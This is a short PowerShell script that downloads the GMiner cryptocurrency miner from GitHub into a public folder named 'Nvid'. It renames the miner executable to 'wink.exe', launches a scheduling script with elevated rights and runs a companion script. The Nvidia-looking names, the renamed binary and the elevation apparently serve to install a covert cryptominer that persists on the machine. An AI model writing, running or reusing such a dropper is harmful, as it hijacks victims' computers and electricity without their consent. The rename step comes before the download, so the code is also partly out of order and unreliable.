$source = 'https://github.com/develsoftware/GMinerRelease/releases/download/3.05/gminer_3_05_windows64.zip'
$destination = 'C:\Users\Public\Downloads\Nvid\gnvid.zip'
$pathtoextract = 'C:\Users\Public\Downloads\Nvid\'
Rename-Item -Path "C:\Users\Public\Downloads\Nvid\miner.exe" -NewName "C:\Users\Public\Downloads\Nvid\wink.exe"
$script = $PSScriptRoot+"\nvidcom.ps1"
 Invoke-WebRequest -Uri $source -OutFile $destination -UseBasicParsing 
 Expand-Archive -Path $destination -DestinationPath $pathtoextract
 Start-Process powershell -verb runas -ArgumentList "-file C:\Users\Public\Downloads\Nvid\nvidschedule.ps1"
& $script


